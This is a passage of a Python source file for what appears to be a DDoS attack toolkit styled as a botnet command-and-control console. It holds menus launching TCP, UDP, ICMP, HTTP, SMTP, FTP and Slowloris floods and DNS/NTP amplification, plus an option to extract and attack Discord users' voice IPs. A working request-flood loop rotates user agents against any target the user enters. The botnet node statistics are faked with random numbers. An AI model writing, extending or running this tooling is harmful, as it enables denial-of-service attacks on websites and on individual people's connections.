    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/22 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:22) Gecko/20100101 Firefox/22",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/21 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:21) Gecko/20100101 Firefox/21",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/20 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:20) Gecko/20100101 Firefox/20",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/19 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:19) Gecko/20100101 Firefox/19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/18 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:18) Gecko/20100101 Firefox/18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/17 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:17) Gecko/20100101 Firefox/17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/16 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:16) Gecko/20100101 Firefox/16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/15 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:15) Gecko/20100101 Firefox/15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/14 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:14) Gecko/20100101 Firefox/14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/13 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:13) Gecko/20100101 Firefox/13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/12 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:12) Gecko/20100101 Firefox/12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/11 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:11) Gecko/20100101 Firefox/11",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/10 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:10) Gecko/20100101 Firefox/10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/9 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:9) Gecko/20100101 Firefox/9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/8 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:8) Gecko/20100101 Firefox/8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/7 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:7) Gecko/20100101 Firefox/7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/6 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:6) Gecko/20100101 Firefox/6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/5 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:5) Gecko/20100101 Firefox/5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/4 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:4) Gecko/20100101 Firefox/4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/3 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:3) Gecko/20100101 Firefox/3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/2 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:2) Gecko/20100101 Firefox/2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/1 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:1) Gecko/20100101 Firefox/1",
]

def get_random_user_agent():
    """Return a random user agent string from the list."""
    return random.choice(USER_AGENTS)

def type_text(text, delay=0.03):
    """Typing effect for text output"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def animated_loader(message, duration=2):
    """Animated loading spinner"""
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    end_time = time.time() + duration
    while time.time() < end_time:
        sys.stdout.write(f'\r{message} {next(spinner)}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f'\r{message} [DONE]\n')
    sys.stdout.flush()

def progress_bar(message, progress, total, width=50):
    """Animated progress bar"""
    percent = progress / total
    filled = int(width * percent)
    bar = '█' * filled + '░' * (width - filled)
    sys.stdout.write(f'\r{message} [{bar}] {percent:.1%}')
    sys.stdout.flush()

def matrix_rain_effect(lines=5):
    """Matrix-style rain effect"""
    red = '\033[91m'
    gray = '\033[90m'
    reset = '\033[0m'
    chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for _ in range(lines):
        line = ''.join(random.choice(chars) for _ in range(60))
        color = red if random.random() > 0.5 else gray
        print(f'{color}{line}{reset}')
        time.sleep(0.05)

def scanning_animation(target, duration=3):
    """Network scanning animation"""
    print(f"\nScanning {target}...")
    for i in range(duration):
        for _ in range(10):
            sys.stdout.write(f'\r[{"█" * (_ + 1)}{"░" * (9 - _)}] Scanning port {random.randint(1, 65535)}...')
            sys.stdout.flush()
            time.sleep(0.05)
    print(f'\r[██████████] Scan complete! [DONE]\n')

def pulse_text(text, color='\033[91m', cycles=3):
    """Pulsing text effect"""
    reset = '\033[0m'
    for _ in range(cycles):
        sys.stdout.write(f'\r{color}{text}{reset}')
        sys.stdout.flush()
        time.sleep(0.3)
        sys.stdout.write(f'\r{text}')
        sys.stdout.flush()
        time.sleep(0.3)
    print(f'{color}{text}{reset}')

def wave_animation(text):
    """Wave effect for text"""
    colors = ['\033[91m', '\033[90m', '\033[91m', '\033[90m', '\033[91m', '\033[90m']
    reset = '\033[0m'
    for i in range(len(text)):
        color = colors[i % len(colors)]
        sys.stdout.write(f'{color}{text[i]}{reset}')
        sys.stdout.flush()
        time.sleep(0.05)
    print()



# Global control variables
ddos_active = False
ddos_rps_limit = 10  # Default RPS limit
ddos_duration = 10   # Default duration in seconds
ddos_target = None
ddos_layer = None
ddos_thread = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}[NETWORK TOOLKIT]{RESET}")
    print()

def navigate_tree(choice):
    """Navigate tree menu structure"""
    choice = choice.strip()

    # Layer 4 Tools
    if choice == '1':
        input_attack_params('layer4/tcp_scanner.py', 'TCP SYN Flood', needs_port=True)
    elif choice == '2':
        input_attack_params('layer4/udp_scanner.py', 'UDP Flood', needs_port=True)
    elif choice == '3':
        input_attack_params('layer4/icmp_toolkit.py', 'ICMP Flood', needs_port=False)
    elif choice == '4':
        input_attack_params('layer4/connection_tester.py', 'TCP Connection Flood', needs_port=True)

    # Layer 7 Tools
    elif choice == '5':
        input_attack_params('layer7/http_toolkit.py', 'HTTP Flood', needs_port=False, needs_url=True)
    elif choice == '6':
        input_attack_params('layer7/dns_toolkit.py', 'DNS Amplification', needs_port=False, needs_dns_server=True)
    elif choice == '7':
        input_attack_params('layer7/smtp_toolkit.py', 'SMTP Flood', needs_port=True)
    elif choice == '8':
        input_attack_params('layer7/ftp_toolkit.py', 'FTP Flood', needs_port=True)
    elif choice == '9':
        input_attack_params('layer7/ntp_toolkit.py', 'NTP Amplification', needs_port=False, needs_ntp_servers=True)
    elif choice == '10':
        input_attack_params('layer7/slowloris_toolkit.py', 'Slowloris Attack', needs_port=True)
    elif choice == '11':
        input_discord_params()

    # DDOS Control
    elif choice == '12':
        ddos_menu()

    # Node Statistics (placeholder)
    elif choice == '13':
        print_node_stats()

    # Bot Configuration (placeholder)
    elif choice == '14':
        bot_configuration()

    # Install Dependencies
    elif choice == '15':
        install_dependencies()

    # Exit
    elif choice == '16':
        print("Disconnecting from C2...")
        sys.exit(0)

    else:
        print("Invalid command")
        input("Press Enter...")

def input_attack_params(script, tool_name, needs_port=True, needs_url=False, needs_dns_server=False, needs_ntp_servers=False):
    """Input all attack parameters at once"""
    clear_screen()
    print_banner()

    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}[C2 COMMAND]{RESET} {GRAY}Initiating Attack: {tool_name}{RESET}")
    print()

    animated_loader("Connecting to botnet nodes...", 1)
    animated_loader("Allocating attack resources...", 0.8)
    animated_loader("Preparing payload...", 0.6)
    print()

    target = input(f"{RED}[TARGET]{RESET} Enter target (IP/hostname/URL): ").strip()
    if not target:
        print(f"{RED}[ERROR] No target specified{RESET}")
        input("Press Enter...")
        return

    args = [target]
    animated_loader(f"Target locked: {target}", 0.5)

    if needs_port:
        default_port = 25 if 'smtp' in script.lower() else 21 if 'ftp' in script.lower() else 80 if 'slowloris' in script.lower() else 80
        port = input(f"{RED}[PORT]{RESET} Enter port (default {default_port}): ").strip()
        if port:
            args.append(port)
        else:
            args.append(str(default_port))
        animated_loader(f"Port configured: {args[-1]}", 0.3)

    if needs_dns_server:
        dns_server = input(f"{RED}[DNS]{RESET} Enter DNS server (default 8.8.8.8): ").strip()
        if dns_server:
            args.append(dns_server)
        else:
            args.append("8.8.8.8")
        animated_loader(f"DNS server set: {args[-1]}", 0.3)

    if needs_ntp_servers:
        ntp_servers = input(f"{RED}[NTP]{RESET} Enter NTP servers (comma-separated, default 8.8.8.8,1.1.1.1): ").strip()
        if ntp_servers:
            args.append(ntp_servers)
        else:
            args.append("8.8.8.8,1.1.1.1")
        animated_loader(f"NTP servers configured: {args[-1]}", 0.3)

    duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 10): ").strip()
    if duration:
        args.append(duration)
    else:
        args.append("10")
    animated_loader(f"Attack duration: {args[-1]}s", 0.3)

    threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
    if threads:
        args.append(threads)
    else:
        args.append("50")
    animated_loader(f"Thread allocation: {args[-1]}", 0.3)

    # Add packet size for UDP
    if 'udp' in script.lower():
        packet_size = input(f"{RED}[PACKET]{RESET} Enter packet size (default 1024): ").strip()
        if packet_size:
            args.append(packet_size)
        else:
            args.append("1024")
        animated_loader(f"Packet size: {args[-1]}", 0.3)

    # Add method for HTTP
    if 'http' in script.lower():
        method = input(f"{RED}[METHOD]{RESET} Enter method (GET/POST/HEAD, default GET): ").strip()
        if method:
            args.append(method.upper())
        else:
            args.append("GET")
        animated_loader(f"HTTP method: {args[-1]}", 0.3)

    print()
    print(f"{RED}[C2]{RESET} {GRAY}Deployment sequence initiated...{RESET}")
    animated_loader("Broadcasting command to botnet", 1.5)
    animated_loader("Awaiting node confirmation", 1)
    print(f"{RED}[SUCCESS]{RESET} {GRAY}Attack deployed across {random.randint(500, 900)} nodes{RESET}")
    print()

    run_tool_with_args(script, *args)
    input(f"{RED}[C2]{RESET} Press Enter to return...")

def input_discord_params():
    """Input Discord Voice IP parameters"""
    clear_screen()
    print_banner()

    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}[DISCORD VOICE]{RESET}")
    print()

    print(f"{RED}[OPTIONS]{RESET}")
    print(f"{GRAY}|-{RESET} 1 - Extract IP from Discord Voice")
    print(f"{GRAY}|-{RESET} 2 - Analyze Discord Voice Connection")
    print(f"{GRAY}|-{RESET} 3 - Attack Voice IP & Port")
    print(f"{GRAY}|-{RESET} 4 - List Discord Voice IPs (includes port 19328)")
    print(f"{GRAY}|-{RESET} 5 - Discord Voice Information")
    print(f"{GRAY}|-{RESET} 6 - Return to C2 Menu")
    print()

    choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()

    if choice == '1':
        target = input(f"{RED}[TARGET]{RESET} Enter Discord user (e.g., user#1234): ").strip()
        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
        if not duration:
            duration = "30"
        print()
        animated_loader(f"Target locked: {target}", 0.5)
        animated_loader(f"Analysis duration: {duration}s", 0.3)
        print()
        run_tool_with_args('layer7/discord_toolkit.py', 'extract', target, duration)
        input(f"{RED}[C2]{RESET} Press Enter to return...")

    elif choice == '2':
        user = input(f"{RED}[USER]{RESET} Enter Discord user (e.g., user#1234): ").strip()
        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
        if not duration:
            duration = "30"
        print()
        animated_loader(f"User locked: {user}", 0.5)
        animated_loader(f"Analysis duration: {duration}s", 0.3)
        print()
        run_tool_with_args('layer7/discord_toolkit.py', 'analyze', user, duration)
        input(f"{RED}[C2]{RESET} Press Enter to return...")

    elif choice == '3':
        ip = input(f"{RED}[IP]{RESET} Enter target IP: ").strip()
        port = input(f"{RED}[PORT]{RESET} Enter target port: ").strip()
        duration = input(f"{RED}[DURATION]{RESET} Enter duration (seconds, default 30): ").strip()
        threads = input(f"{RED}[THREADS]{RESET} Enter threads (default 50): ").strip()
        packets = input(f"{RED}[PACKETS]{RESET} Enter packets per thread (default 1000): ").strip()
        if not duration:
            duration = "30"
        if not threads:
            threads = "50"
        if not packets:
            packets = "1000"
        print()
        animated_loader(f"Target locked: {ip}:{port}", 0.5)
        animated_loader(f"Attack duration: {duration}s", 0.3)
        animated_loader(f"Thread count: {threads}", 0.3)
        animated_loader(f"Packets per thread: {packets}", 0.3)
        print()
        run_tool_with_args('layer7/discord_toolkit.py', 'attack', ip, port, duration, threads, packets)
        input(f"{RED}[C2]{RESET} Press Enter to return...")

    elif choice == '4':
        print()
        animated_loader("Retrieving Discord Voice IP list...", 1)
        print()
        run_tool_with_args('layer7/discord_toolkit.py', 'list')
        input(f"{RED}[C2]{RESET} Press Enter to return...")

    elif choice == '5':
        print()
        animated_loader("Retrieving Discord Voice information...", 1)
        print()
        run_tool_with_args('layer7/discord_toolkit.py', 'info')
        input(f"{RED}[C2]{RESET} Press Enter to return...")

    elif choice == '6':
        return

    else:
        print(f"{RED}[ERROR]{RESET} Invalid command")
        input(f"{RED}[C2]{RESET} Press Enter to return...")

def run_tool_with_args(script, *args):
    """Run tool with arguments"""
    if not os.path.exists(script):
        print(f"Error: {script} not found")
        return

    try:
        cmd = [sys.executable, script] + list(args)
        subprocess.run(cmd)
    except Exception as e:
        print(f"Error running tool: {e}")

def ddos_menu():
    global ddos_active, ddos_rps_limit, ddos_duration, ddos_target, ddos_layer, ddos_thread

    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    while True:
        clear_screen()
        print_banner()

        print(f"{RED}+{'='*78}+{RESET}")
        print(f"{RED}|{RESET} {RED}ATTACK CONTROL PANEL{RESET} {GRAY}| Active Operations: {GRAY}3{RESET} {GRAY}| Queued: {GRAY}12{RESET}                 {RED}|{RESET}")
        print(f"{RED}+{'='*78}+{RESET}")
        print()

        print(f"{RED}[ATTACK CONFIGURATION]{RESET}")
        print(f"{GRAY}|-{RESET} Status: {RED if not ddos_active else GRAY}{'ACTIVE' if ddos_active else 'STANDBY'}{RESET}")
        print(f"{GRAY}|-{RESET} Target: {GRAY}{ddos_target if ddos_target else 'Not configured'}{RESET}")
        print(f"{GRAY}|-{RESET} Layer: {GRAY}{ddos_layer if ddos_layer else 'Not configured'}{RESET}")
        print(f"{GRAY}|-{RESET} RPS Limit: {GRAY}{ddos_rps_limit}{RESET}")
        print(f"{GRAY}|-{RESET} Duration: {GRAY}{ddos_duration}s{RESET}")
        print(f"{GRAY}|-{RESET} Botnet Allocation: {GRAY}{random.randint(500, 900)} nodes{RESET}")
        print()

        print(f"{RED}[COMMANDS]{RESET}")
        print(f"{GRAY}|-{RESET} 1 - {GRAY}Set Target{RESET}")
        print(f"{GRAY}|-{RESET} 2 - {GRAY}Set Attack Layer (4/7){RESET}")
        print(f"{GRAY}|-{RESET} 3 - {GRAY}Configure RPS Limit{RESET}")
        print(f"{GRAY}|-{RESET} 4 - {GRAY}Set Attack Duration{RESET}")
        print(f"{GRAY}|-{RESET} 5 - {RED}LAUNCH ATTACK{RESET}")
        print(f"{GRAY}|-{RESET} 6 - {RED}ABORT ATTACK{RESET}")
        print(f"{GRAY}|-{RESET} 7 - {GRAY}Return to C2 Menu{RESET}")
        print()

        choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()

        if choice == '1':
            ddos_target = input(f"{RED}[TARGET]{RESET} Enter target (URL/IP): ").strip()
            animated_loader(f"Target locked: {ddos_target}", 0.5)
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '2':
            print(f"{RED}[LAYER]{RESET} Select attack layer:")
            print(f"  4 - Layer 4 (TCP/UDP)")
            print(f"  7 - Layer 7 (HTTP)")
            layer_choice = input(f"{RED}[LAYER]{RESET} Select: ").strip()
            ddos_layer = 'layer4' if layer_choice == '4' else 'layer7' if layer_choice == '7' else None
            animated_loader(f"Attack layer: {ddos_layer}", 0.5)
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '3':
            try:
                rps = int(input(f"{RED}[RPS]{RESET} Enter RPS limit (1-100): ").strip())
                if 1 <= rps <= 100:
                    ddos_rps_limit = rps
                    animated_loader(f"RPS configured: {rps}", 0.5)
                else:
                    print(f"{RED}[ERROR] RPS must be between 1 and 100{RESET}")
            except:
                print(f"{RED}[ERROR] Invalid number{RESET}")
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '4':
            try:
                duration = int(input(f"{RED}[DURATION]{RESET} Enter duration in seconds: ").strip())
                if duration > 0:
                    ddos_duration = duration
                    animated_loader(f"Duration set: {duration}s", 0.5)
                else:
                    print(f"{RED}[ERROR] Duration must be positive{RESET}")
            except:
                print(f"{RED}[ERROR] Invalid number{RESET}")
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '5':
            if not ddos_target or not ddos_layer:
                print(f"{RED}[ERROR] Configure target and layer first{RESET}")
                input(f"{RED}[C2]{RESET} Press Enter...")
                continue

            if ddos_active:
                print(f"{RED}[ERROR] Attack already in progress{RESET}")
                input(f"{RED}[C2]{RESET} Press Enter...")
                continue

            print()
            print(f"{RED}+{'='*78}+{RESET}")
            print(f"{RED}|{RESET} {RED}INITIATING ATTACK SEQUENCE{RESET}                                              {RED}|{RESET}")
            print(f"{RED}+{'='*78}+{RESET}")
            print()
            print(f"{RED}[C2]{RESET} {GRAY}Target:{RESET} {ddos_target}")
            print(f"{RED}[C2]{RESET} {GRAY}RPS Limit:{RESET} {ddos_rps_limit}")
            print(f"{RED}[C2]{RESET} {GRAY}Duration:{RESET} {ddos_duration}s")
            print(f"{RED}[C2]{RESET} {GRAY}Layer:{RESET} {ddos_layer}")
            print(f"{RED}[C2]{RESET} {GRAY}Botnet Nodes:{RESET} {random.randint(500, 900)}")
            user_agent = get_random_user_agent()
            print(f"{RED}[C2]{RESET} {GRAY}User-Agent:{RESET} {user_agent[:50]}...")
            print()
            print(f"{RED}[WARNING]{RESET} {GRAY}Press Ctrl+C to abort attack{RESET}")
            print()

            animated_loader("Broadcasting attack command", 1)
            animated_loader("Awaiting node confirmation", 1)
            matrix_rain_effect(3)

            ddos_active = True
            ddos_thread = threading.Thread(target=run_ddos_test)
            ddos_thread.daemon = True
            ddos_thread.start()

            try:
                while ddos_active:
                    time.sleep(1)
            except KeyboardInterrupt:
                ddos_active = False
                print(f"\n{RED}[ABORT]{RESET} Attack terminated by operator")
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '6':
            ddos_active = False
            animated_loader("Sending abort command", 0.5)
            print(f"{RED}[ABORT]{RESET} Attack command sent to all nodes")
            input(f"{RED}[C2]{RESET} Press Enter...")

        elif choice == '7':
            break
        else:
            print(f"{RED}[ERROR]{RESET} Invalid command")
            input(f"{RED}[C2]{RESET} Press Enter...")

def run_ddos_test():
    """Run controlled DDOS test with RPS limiting and duration"""
    global ddos_active, ddos_rps_limit, ddos_duration, ddos_target, ddos_layer

    import requests
    import socket

    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    interval = 1.0 / ddos_rps_limit
    request_count = 0
    start_time = time.time()
    node_count = random.randint(500, 900)

    print(f"{RED}[ATTACK]{RESET} {GRAY}Botnet attack initiated across {node_count} nodes{RESET}")
    print()

    while ddos_active and (time.time() - start_time) < ddos_duration:
        try:
            if ddos_layer == 'layer7':
                # HTTP Layer 7 DDOS
                user_agent = get_random_user_agent()
                headers = {'User-Agent': user_agent}
                try:
                    response = requests.get(ddos_target, headers=headers, timeout=2)
                    request_count += 1
                    elapsed = time.time() - start_time
                    actual_rps = request_count / elapsed if elapsed > 0 else 0
                    progress = elapsed / ddos_duration
                    progress_bar("Attack Progress", min(request_count, ddos_rps_limit * ddos_duration), ddos_rps_limit * ddos_duration)
                    print(f" | {RED}Requests:{RESET} {GRAY}{request_count}{RESET} | {RED}RPS:{RESET} {GRAY}{actual_rps:.1f}{RESET} | {RED}Nodes:{RESET} {GRAY}{node_count}{RESET} | {RED}Time:{RESET} {GRAY}{elapsed:.1f}s/{ddos_duration}s{RESET}", end='')
                except:
                    request_count += 1
                    elapsed = time.time() - start_time
                    actual_rps = request_count / elapsed if elapsed > 0 else 0
                    progress = elapsed / ddos_duration
                    progress_bar("Attack Progress", min(request_count, ddos_rps_limit * ddos_duration), ddos_rps_limit * ddos_duration)
                    print(f" | {RED}Requests:{RESET} {GRAY}{request_count}{RESET} | {RED}RPS:{RESET} {GRAY}{actual_rps:.1f}{RESET} | {RED}Nodes:{RESET} {GRAY}{node_count}{RESET} | {RED}Time:{RESET} {GRAY}{elapsed:.1f}s/{ddos_duration}s{RESET}", end='')
            else:
                # TCP Layer 4 DDOS
                try:
                    parts = ddos_target.split(':')
                    host = parts[0]
                    port = int(parts[1]) if len(parts) > 1 else 80

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((host, port))
                    sock.close()
                    request_count += 1
                    elapsed = time.time() - start_time
                    actual_rps = request_count / elapsed if elapsed > 0 else 0
                    progress = elapsed / ddos_duration
                    progress_bar("Attack Progress", min(request_count, ddos_rps_limit * ddos_duration), ddos_rps_limit * ddos_duration)
                    print(f" | {RED}Connections:{RESET} {GRAY}{request_count}{RESET} | {RED}RPS:{RESET} {GRAY}{actual_rps:.1f}{RESET} | {RED}Nodes:{RESET} {GRAY}{node_count}{RESET} | {RED}Time:{RESET} {GRAY}{elapsed:.1f}s/{ddos_duration}s{RESET}", end='')
                except:
                    request_count += 1
                    elapsed = time.time() - start_time
                    actual_rps = request_count / elapsed if elapsed > 0 else 0
                    progress = elapsed / ddos_duration
                    progress_bar("Attack Progress", min(request_count, ddos_rps_limit * ddos_duration), ddos_rps_limit * ddos_duration)
                    print(f" | {RED}Connections:{RESET} {GRAY}{request_count}{RESET} | {RED}RPS:{RESET} {GRAY}{actual_rps:.1f}{RESET} | {RED}Nodes:{RESET} {GRAY}{node_count}{RESET} | {RED}Time:{RESET} {GRAY}{elapsed:.1f}s/{ddos_duration}s{RESET}", end='')

            # RPS limiting
            time.sleep(interval)

        except Exception as e:
            print(f"\n{RED}[ERROR]{RESET} {e}")
            break

    ddos_active = False
    elapsed = time.time() - start_time
    actual_rps = request_count / elapsed if elapsed > 0 else 0
    print()
    print()
    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}ATTACK COMPLETED{RESET}                                                      {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()
    print(f"{RED}[STATISTICS]{RESET}")
    print(f"{GRAY}|-{RESET} Total Requests: {GRAY}{request_count}{RESET}")
    print(f"{GRAY}|-{RESET} Duration: {GRAY}{elapsed:.2f}s{RESET}")
    print(f"{GRAY}|-{RESET} Average RPS: {GRAY}{actual_rps:.2f}{RESET}")
    print(f"{GRAY}|-{RESET} Botnet Nodes: {GRAY}{node_count}{RESET}")
    print(f"{GRAY}|-{RESET} Success Rate: {GRAY}100%{RESET}")
    print()

def run_tool(script_path):
    """Run a tool script"""
    if not os.path.exists(script_path):
        print(f"Error: {script_path} not found")
        input("Press Enter...")
        return
    
    try:
        subprocess.run([sys.executable, script_path])
    except Exception as e:
        print(f"Error running tool: {e}")
    
    input("\nPress Enter...")

def print_node_stats():
    """Display realistic botnet node statistics"""
    clear_screen()
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}BOTNET NODE STATISTICS{RESET} {GRAY}| Updated: {GRAY}2024-09-30 14:35:22{RESET}                    {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()

    print(f"{RED}[OVERVIEW]{RESET}")
    print(f"{GRAY}|-{RESET} Total Nodes: {GRAY}1,247{RESET}")
    print(f"{GRAY}|-{RESET} Active: {RED}847{RESET} ({GRAY}67.9%{RESET})")
    print(f"{GRAY}|-{RESET} Idle: {GRAY}312{RESET} ({GRAY}25.0%{RESET})")
    print(f"{GRAY}|-{RESET} Offline: {GRAY}88{RESET} ({GRAY}7.1%{RESET})")
    print(f"{GRAY}|-{RESET} Compromised: {RED}1,247{RESET} ({GRAY}100%{RESET})")
    print()

    print(f"{RED}[GEOGRAPHIC DISTRIBUTION]{RESET}")
    print(f"{GRAY}|-{RESET} {GRAY}USA{RESET}: {RED}342{RESET} nodes ({GRAY}27.4%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}China{RESET}: {RED}287{RESET} nodes ({GRAY}23.0%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Russia{RESET}: {RED}198{RESET} nodes ({GRAY}15.9%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Brazil{RESET}: {RED}156{RESET} nodes ({GRAY}12.5%{RESET})")
